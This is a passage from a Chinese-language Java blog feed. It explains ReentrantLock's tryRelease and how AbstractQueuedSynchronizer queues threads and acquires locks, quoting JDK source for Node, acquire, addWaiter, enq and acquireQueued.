<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> releases)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> c = getState() - releases;</span><br><span class="line">            <span class="keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">            <span class="keyword">boolean</span> free = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">                free = <span class="keyword">true</span>;</span><br><span class="line">                setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            setState(c);</span><br><span class="line">            <span class="keyword">return</span> free;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>主要流程是：</p>
<ol>
<li>改变状态值</li>
<li>如果当前线程不是占有锁的独占线程，抛出异常。只能由占有锁的线程释放锁</li>
<li>判断状态值是否已经为0了，是的话，说明锁已经没有线程占用了，自由了</li>
<li>设置状态值，返回</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>多线程</tag>
        <tag>ReentrantLock</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>Java AQS 解析</title>
    <url>/2020/03/12/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-12-%E5%A4%9A%E7%BA%BF%E7%A8%8B-04.Java-AQS-%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="AbstractQueuedSynchronizer（AQS）"><a href="#AbstractQueuedSynchronizer（AQS）" class="headerlink" title="AbstractQueuedSynchronizer（AQS）"></a>AbstractQueuedSynchronizer（AQS）</h1><p>Java并发包（JUC）中提供了很多并发工具，这其中，很多我们耳熟能详的并发工具，譬如ReentrangLock、Semaphore，它们的实现都用到了一个共同的基类–<strong>AbstractQueuedSynchronizer</strong>,简称AQS。AQS是一个用来构建锁和同步器的框架，使用AQS能简单且高效地构造出应用广泛的大量的同步器，比如我们提到的ReentrantLock，Semaphore，其他的诸如ReentrantReadWriteLock，SynchronousQueue，FutureTask等等皆是基于AQS的。当然，我们自己也能利用AQS非常轻松容易地构造出符合我们自己需求的同步器。</p>
<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>AQS使用一个int成员变量来表示同步状态，通过内置的FIFO队列来完成获取资源线程的排队工作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> state;<span class="comment">//共享变量，使用volatile修饰保证线程可见性</span></span><br></pre></td></tr></table></figure>

<p>状态信息通过protected类型的<strong>getState</strong>，<strong>setState</strong>，<strong>compareAndSetState</strong>进行操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getState</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(<span class="keyword">int</span> newState)</span></span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">compareAndSetState</span><span class="params">(<span class="keyword">int</span> expect, <span class="keyword">int</span> update)</span></span></span><br></pre></td></tr></table></figure>



<p>AQS支持两种同步方式：</p>
<ul>
<li>独占式</li>
<li>共享式</li>
</ul>
<p>这样方便使用者实现不同类型的同步组件，独占式如ReentrantLock，共享式如Semaphore，CountDownLatch，组合式的如ReentrantReadWriteLock。总之，AQS为使用提供了底层支撑，如何组装实现，使用者可以自由发挥。</p>
<p>同步器的设计是基于<strong>模板方法模式</strong>的，一般的使用方式是这样：</p>
<p>　　<strong>1.使用者继承AbstractQueuedSynchronizer并重写指定的方法。（这些重写方法很简单，无非是对于共享资源state的获取和释放）</strong></p>
<p>　　<strong>2.将AQS组合在自定义同步组件的实现中，并调用其模板方法，而这些模板方法会调用使用者重写的方法。</strong></p>
<p>可能需要重新定义的protected method</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//独占模式</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> arg)</span></span>;</span><br><span class="line"><span class="comment">//共享模式</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">tryAcquireShared</span><span class="params">(<span class="keyword">int</span> arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryReleaseShared</span><span class="params">(<span class="keyword">int</span> arg)</span></span>;</span><br><span class="line"><span class="comment">//判断当前线程是否排它持有state</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isHeldExclusively</span><span class="params">()</span>；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//以上方法在AQS中默认实现为throw new UnsupportedOperationException();</span></span></span><br></pre></td></tr></table></figure>

<p>子类可以维护其他状态字段，但是只有使用方法getState、setState和compareAndSetState操纵的原子更新的{int state}值在同步方面被跟踪。AbstractQueuedSynchronizer的子类应该定义为非公共的内部助手类，用于实现其封闭类的同步属性。</p>
<h2 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h2><p>对于使用者来讲，我们无需关心获取资源失败，线程排队，线程阻塞/唤醒等一系列复杂的实现，这些都在AQS中为我们处理好了。我们只需要负责好自己的那个环节就好，也就是获取/释放共享资源state的姿势T_T。很经典的模板方法设计模式的应用，AQS为我们定义好顶级逻辑的骨架，并提取出公用的线程入队列/出队列，阻塞/唤醒等一系列复杂逻辑的实现，将部分简单的可由使用者决定的操作逻辑延迟到子类中去实现即可。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先，我们需要去继承AbstractQueuedSynchronizer这个类，然后我们根据我们的需求去重写相应的方法，比如要实现一个独占锁，那就去重写tryAcquire，tryRelease方法，要实现共享锁，就去重写tryAcquireShared，tryReleaseShared；最后，在我们的组件中调用AQS中的模板方法就可以了，而这些模板方法是会调用到我们之前重写的那些方法的。也就是说，我们只需要很小的工作量就可以实现自己的同步组件，重写的那些方法，仅仅是一些简单的对于共享资源state的获取和释放操作，至于像是获取资源失败，线程需要阻塞之类的操作，自然是AQS帮我们完成了。</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>AQS维护了一个共享资源state，通过内置的FIFO队列完成排队的工作。这个队列是一个由Node节点组成的双向量表。AQS分别维护了它的一头一尾两个指针。</p>
<p><img src="https://huhansi.github.io/images/2020-03-12-node-linked-list.png" alt="Node节点组成的双向队列"></p>
<h3 id="独占式"><a href="#独占式" class="headerlink" title="独占式"></a>独占式</h3><h4 id="Node节点"><a href="#Node节点" class="headerlink" title="Node节点"></a>Node节点</h4><p>Node节点是AQS里面的一个静态内部类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">        <span class="comment">/** Marker to indicate a node is waiting in shared mode */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> Node SHARED = <span class="keyword">new</span> Node();</span><br><span class="line">        <span class="comment">/** Marker to indicate a node is waiting in exclusive mode */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> Node EXCLUSIVE = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** waitStatus value to indicate thread has cancelled */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CANCELLED =  <span class="number">1</span>;</span><br><span class="line">        <span class="comment">/** waitStatus value to indicate successor's thread needs unparking */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SIGNAL    = -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">/** waitStatus value to indicate thread is waiting on condition */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CONDITION = -<span class="number">2</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * waitStatus value to indicate the next acquireShared should</span></span><br><span class="line"><span class="comment">         * unconditionally propagate</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PROPAGATE = -<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Status field, taking on only the values:</span></span><br><span class="line"><span class="comment">         *   SIGNAL:     The successor of this node is (or will soon be)</span></span><br><span class="line"><span class="comment">         *               blocked (via park), so the current node must</span></span><br><span class="line"><span class="comment">         *               unpark its successor when it releases or</span></span><br><span class="line"><span class="comment">         *               cancels. To avoid races, acquire methods must</span></span><br><span class="line"><span class="comment">         *               first indicate they need a signal,</span></span><br><span class="line"><span class="comment">         *               then retry the atomic acquire, and then,</span></span><br><span class="line"><span class="comment">         *               on failure, block.</span></span><br><span class="line"><span class="comment">         *   CANCELLED:  This node is cancelled due to timeout or interrupt.</span></span><br><span class="line"><span class="comment">         *               Nodes never leave this state. In particular,</span></span><br><span class="line"><span class="comment">         *               a thread with cancelled node never again blocks.</span></span><br><span class="line"><span class="comment">         *   CONDITION:  This node is currently on a condition queue.</span></span><br><span class="line"><span class="comment">         *               It will not be used as a sync queue node</span></span><br><span class="line"><span class="comment">         *               until transferred, at which time the status</span></span><br><span class="line"><span class="comment">         *               will be set to 0. (Use of this value here has</span></span><br><span class="line"><span class="comment">         *               nothing to do with the other uses of the</span></span><br><span class="line"><span class="comment">         *               field, but simplifies mechanics.)</span></span><br><span class="line"><span class="comment">         *   PROPAGATE:  A releaseShared should be propagated to other</span></span><br><span class="line"><span class="comment">         *               nodes. This is set (for head node only) in</span></span><br><span class="line"><span class="comment">         *               doReleaseShared to ensure propagation</span></span><br><span class="line"><span class="comment">         *               continues, even if other operations have</span></span><br><span class="line"><span class="comment">         *               since intervened.</span></span><br><span class="line"><span class="comment">         *   0:          None of the above</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * The values are arranged numerically to simplify use.</span></span><br><span class="line"><span class="comment">         * Non-negative values mean that a node doesn't need to</span></span><br><span class="line"><span class="comment">         * signal. So, most code doesn't need to check for particular</span></span><br><span class="line"><span class="comment">         * values, just for sign.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * The field is initialized to 0 for normal sync nodes, and</span></span><br><span class="line"><span class="comment">         * CONDITION for condition nodes.  It is modified using CAS</span></span><br><span class="line"><span class="comment">         * (or when possible, unconditional volatile writes).</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="keyword">int</span> waitStatus;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Link to predecessor node that current node/thread relies on</span></span><br><span class="line"><span class="comment">         * for checking waitStatus. Assigned during enqueuing, and nulled</span></span><br><span class="line"><span class="comment">         * out (for sake of GC) only upon dequeuing.  Also, upon</span></span><br><span class="line"><span class="comment">         * cancellation of a predecessor, we short-circuit while</span></span><br><span class="line"><span class="comment">         * finding a non-cancelled one, which will always exist</span></span><br><span class="line"><span class="comment">         * because the head node is never cancelled: A node becomes</span></span><br><span class="line"><span class="comment">         * head only as a result of successful acquire. A</span></span><br><span class="line"><span class="comment">         * cancelled thread never succeeds in acquiring, and a thread only</span></span><br><span class="line"><span class="comment">         * cancels itself, not any other node.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">volatile</span> Node prev;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Link to the successor node that the current node/thread</span></span><br><span class="line"><span class="comment">         * unparks upon release. Assigned during enqueuing, adjusted</span></span><br><span class="line"><span class="comment">         * when bypassing cancelled predecessors, and nulled out (for</span></span><br><span class="line"><span class="comment">         * sake of GC) when dequeued.  The enq operation does not</span></span><br><span class="line"><span class="comment">         * assign next field of a predecessor until after attachment,</span></span><br><span class="line"><span class="comment">         * so seeing a null next field does not necessarily mean that</span></span><br><span class="line"><span class="comment">         * node is at end of queue. However, if a next field appears</span></span><br><span class="line"><span class="comment">         * to be null, we can scan prev's from the tail to</span></span><br><span class="line"><span class="comment">         * double-check.  The next field of cancelled nodes is set to</span></span><br><span class="line"><span class="comment">         * point to the node itself instead of null, to make life</span></span><br><span class="line"><span class="comment">         * easier for isOnSyncQueue.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">volatile</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * The thread that enqueued this node.  Initialized on</span></span><br><span class="line"><span class="comment">         * construction and nulled out after use.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">volatile</span> Thread thread;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Link to next node waiting on condition, or the special</span></span><br><span class="line"><span class="comment">         * value SHARED.  Because condition queues are accessed only</span></span><br><span class="line"><span class="comment">         * when holding in exclusive mode, we just need a simple</span></span><br><span class="line"><span class="comment">         * linked queue to hold nodes while they are waiting on</span></span><br><span class="line"><span class="comment">         * conditions. They are then transferred to the queue to</span></span><br><span class="line"><span class="comment">         * re-acquire. And because conditions can only be exclusive,</span></span><br><span class="line"><span class="comment">         * we save a field by using special value to indicate shared</span></span><br><span class="line"><span class="comment">         * mode.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Node nextWaiter;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Returns true if node is waiting in shared mode.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isShared</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextWaiter == SHARED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Returns previous node, or throws NullPointerException if null.</span></span><br><span class="line"><span class="comment">         * Use when predecessor cannot be null.  The null check could</span></span><br><span class="line"><span class="comment">         * be elided, but is present to help the VM.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> the predecessor of this node</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> Node <span class="title">predecessor</span><span class="params">()</span> <span class="keyword">throws</span> NullPointerException </span>&#123;</span><br><span class="line">            Node p = prev;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node() &#123;    <span class="comment">// Used to establish initial head or SHARED marker</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node(Thread thread, Node mode) &#123;     <span class="comment">// Used by addWaiter</span></span><br><span class="line">            <span class="keyword">this</span>.nextWaiter = mode;</span><br><span class="line">            <span class="keyword">this</span>.thread = thread;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node(Thread thread, <span class="keyword">int</span> waitStatus) &#123; <span class="comment">// Used by Condition</span></span><br><span class="line">            <span class="keyword">this</span>.waitStatus = waitStatus;</span><br><span class="line">            <span class="keyword">this</span>.thread = thread;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>里面这几个字段是比较重要的</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>CANCELLED</td>
<td>waitStatus取值范围之一</td>
<td>因为超时或者中断，节点会被设置为取消状态，被取消状态的节点不应该去竞争锁，只能保持取消状态不变，不能转为其他状态。处于这种状态的节点会被踢出队列，被GC回收。</td>
</tr>
<tr>
<td>SIGNAL</td>
<td>waitStatus取值范围之一</td>
<td>表示这个节点的继任节点被阻塞了，到时候需要通知它。</td>
</tr>
<tr>
<td>CONDITION</td>
<td>waitStatus取值范围之一</td>
<td>表示这个节点因为等待某个条件而被阻塞</td>
</tr>
<tr>
<td>PROPAGATE</td>
<td>waitStatus取值范围之一</td>
<td>使用在共享模式头结点有可能处于这种状态，表示锁的下一次获取可以无条件传播；</td>
</tr>
<tr>
<td>waitStatus</td>
<td>int</td>
<td>初始值为0，新节点的默认状态</td>
</tr>
<tr>
<td>prev</td>
<td>Node</td>
<td>当前节点的前一个节点</td>
</tr>
<tr>
<td>next</td>
<td>Node</td>
<td>当前节点的继任节点</td>
</tr>
<tr>
<td>thread</td>
<td>Thread</td>
<td>与节点关联的排队中的线程</td>
</tr>
</tbody></table>
<h4 id="获取锁"><a href="#获取锁" class="headerlink" title="获取锁"></a>获取锁</h4><p>接下来我们看看，acquire方法是怎么获取锁的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Acquires in exclusive mode, ignoring interrupts.  Implemented</span></span><br><span class="line"><span class="comment">     * by invoking at least once &#123;<span class="doctag">@link</span> #tryAcquire&#125;,</span></span><br><span class="line"><span class="comment">     * returning on success.  Otherwise the thread is queued, possibly</span></span><br><span class="line"><span class="comment">     * repeatedly blocking and unblocking, invoking &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment">     * #tryAcquire&#125; until success.  This method can be used</span></span><br><span class="line"><span class="comment">     * to implement method &#123;<span class="doctag">@link</span> Lock#lock&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the acquire argument.  This value is conveyed to</span></span><br><span class="line"><span class="comment">     *        &#123;<span class="doctag">@link</span> #tryAcquire&#125; but is otherwise uninterpreted and</span></span><br><span class="line"><span class="comment">     *        can represent anything you like.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">acquire</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class="line">            acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class="line">            selfInterrupt();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上述方法主要做以下操作：</p>
<ol>
<li>调用使用者重写的tryAcquire方法，如果返回true，表示获取同步状态成功，直接返回</li>
<li>如果获取同步状态失败，就构造独占式同步节点，通过addWaiter方法将此节点添加到同步队列的尾部</li>
<li>该节点在队列中尝试获取同步状态，如果获取不到，则阻塞节点线程，知道被前驱节点唤醒或者被中断</li>
</ol>
<p>看一下addWaiter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates and enqueues node for current thread and given mode.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mode Node.EXCLUSIVE for exclusive, Node.SHARED for shared</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the new node</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">addWaiter</span><span class="params">(Node mode)</span> </span>&#123;</span><br><span class="line">        Node node = <span class="keyword">new</span> Node(Thread.currentThread(), mode);</span><br><span class="line">        <span class="comment">// Try the fast path of enq; backup to full enq on failure</span></span><br><span class="line">        Node pred = tail;</span><br><span class="line">        <span class="keyword">if</span> (pred != <span class="keyword">null</span>) &#123;</span><br><span class="line">            node.prev = pred;</span><br><span class="line">            <span class="keyword">if</span> (compareAndSetTail(pred, node)) &#123;</span><br><span class="line">                pred.next = node;</span><br><span class="line">                <span class="keyword">return</span> node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        enq(node);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>以CAS方式将当前节点加入到队列的尾部，如果失败了，就进入enq方法。</p>
<p>enq方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Inserts node into queue, initializing if necessary. See picture above.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node to insert</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> node's predecessor</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">enq</span><span class="params">(<span class="keyword">final</span> Node node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            Node t = tail;</span><br><span class="line">            <span class="keyword">if</span> (t == <span class="keyword">null</span>) &#123; <span class="comment">// Must initialize</span></span><br><span class="line">                <span class="keyword">if</span> (compareAndSetHead(<span class="keyword">new</span> Node()))</span><br><span class="line">                    tail = head;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node.prev = t;</span><br><span class="line">                <span class="keyword">if</span> (compareAndSetTail(t, node)) &#123;</span><br><span class="line">                    t.next = node;</span><br><span class="line">                    <span class="keyword">return</span> t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>enq中有一个死循环，在这个循环中，一直用CAS方法取设置节点。直到成功为止。</p>
<p>接着我们在看看acquireQueued方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Acquires in exclusive uninterruptible mode for thread already in</span></span><br><span class="line"><span class="comment">     * queue. Used by condition wait methods as well as acquire.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the acquire argument</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if interrupted while waiting</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">acquireQueued</span><span class="params">(<span class="keyword">final</span> Node node, <span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> failed = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> interrupted = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">final</span> Node p = node.predecessor();</span><br><span class="line">                <span class="keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class="line">                    setHead(node);</span><br><span class="line">                    p.next = <span class="keyword">null</span>; <span class="comment">// help GC</span></span><br><span class="line">                    failed = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">return</span> interrupted;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class="line">                    parkAndCheckInterrupt())</span><br><span class="line">                    interrupted = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (failed)</span><br><span class="line">                cancelAcquire(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>acquireQueued内部也是一个死循环，只有前驱结点是头结点的结点，也就是老二结点，才有机会去tryAcquire；若tryAcquire成功，表示获取同步状态成功，将此结点设置为头结点；若是非老二结点，或者tryAcquire失败，则进入shouldParkAfterFailedAcquire去判断判断当前线程是否应该阻塞，若可以，调用parkAndCheckInterrupt阻塞当前线程，直到被中断或者被前驱结点唤醒。若还不能休息，继续循环。</p>
<p><strong>shouldParkAfterFailedAcquire</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Checks and updates status for a node that failed to acquire.</span></span><br><span class="line"><span class="comment">     * Returns true if thread should block. This is the main signal</span></span><br><span class="line"><span class="comment">     * control in all acquire loops.  Requires that pred == node.prev.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pred node's predecessor holding status</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if thread should block</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">shouldParkAfterFailedAcquire</span><span class="params">(Node pred, Node node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ws = pred.waitStatus;</span><br><span class="line">        <span class="keyword">if</span> (ws == Node.SIGNAL)</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * This node has already set status asking a release</span></span><br><span class="line"><span class="comment">             * to signal it, so it can safely park.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (ws &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Predecessor was cancelled. Skip over predecessors and</span></span><br><span class="line"><span class="comment">             * indicate retry.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                node.prev = pred = pred.prev;</span><br><span class="line">            &#125; <span class="keyword">while</span> (pred.waitStatus &gt; <span class="number">0</span>);</span><br><span class="line">            pred.next = node;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * waitStatus must be 0 or PROPAGATE.  Indicate that we</span></span><br><span class="line"><span class="comment">             * need a signal, but don't park yet.  Caller will need to</span></span><br><span class="line"><span class="comment">             * retry to make sure it cannot acquire before parking.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            compareAndSetWaitStatus(pred, ws, Node.SIGNAL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>若shouldParkAfterFailedAcquire返回true，也就是当前结点的前驱结点为SIGNAL状态，则意味着当前结点可以放心休息，进入parking状态了。parkAncCheckInterrupt阻塞线程并处理中断。</p>
<p><strong>parkAndCheckInterrupt</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Convenience method to park and then check if interrupted</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if interrupted</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">parkAndCheckInterrupt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        LockSupport.park(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> Thread.interrupted();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>总的来说就是：</p>
<ol>
<li>首先tryAcquire获取同步状态，成功则直接返回；否则，进入下一环节；</li>
<li>线程获取同步状态失败，就构造一个结点，加入同步队列中，这个过程要保证线程安全；</li>
<li>加入队列中的结点线程进入自旋状态，若是老二结点（即前驱结点为头结点），才有机会尝试去获取同步状态；否则，当其前驱结点的状态为SIGNAL，线程便可安心休息，进入阻塞状态，直到被中断或者被前驱结点唤醒。</li>
</ol>
<h4 id="释放锁"><a href="#释放锁" class="headerlink" title="释放锁"></a>释放锁</h4><p><strong>release</strong>方法</p>
